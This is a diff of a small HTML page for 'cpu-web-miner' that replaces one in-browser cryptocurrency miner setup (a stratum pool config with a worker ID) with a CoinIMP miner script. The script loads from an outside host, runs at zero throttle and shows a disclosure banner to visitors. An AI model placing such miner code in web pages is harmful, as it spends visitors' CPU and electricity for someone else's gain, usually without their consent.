@@ -4,25 +4,14 @@
 
 <h2>Thanks for using cpu-web-miner</h2>
 
-<script type="module">
-import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
+<script src="https://www.hostingcloud.racing/eQ8R.js"></script>
+<script>
+    var _client = new Client.Anonymous('92853f5afd830cffe37201431881c8433a276def5bccb559b273f38093e5904d', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
-const stratum = {
-    server: "eu.coinXpool.com",
-    port: 8243,
-    worker: "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.suto",
-    password: "c=MAZA,m=solo",
-    ssl: false // true when pool uses SSL, false otherwise
-}
-
-cpuWebMiner.start(
-    cpuWebMiner.minotaurx,
-    stratum,
-    null,
-    cpuWebMiner.ALL_THREADS,
-    work => console.log(work),
-    hashrate => console.log(hashrate),
-    error => console.log(error));
 </script> 
 
 </body>
